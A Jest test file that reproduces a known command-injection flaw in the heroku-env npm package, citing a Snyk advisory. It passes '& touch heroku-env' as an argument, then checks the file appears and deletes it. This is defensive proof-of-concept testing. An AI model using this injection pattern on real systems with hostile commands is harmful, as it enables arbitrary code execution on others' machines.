//https://snyk.io/vuln/SNYK-JS-HEROKUENV-1050432
test("Command Injection in heroku-env", () => {
  const root = require("heroku-env");
  const fs = require("fs");
  const path = "./heroku-env";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root("& touch heroku-env", "aa", function () {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
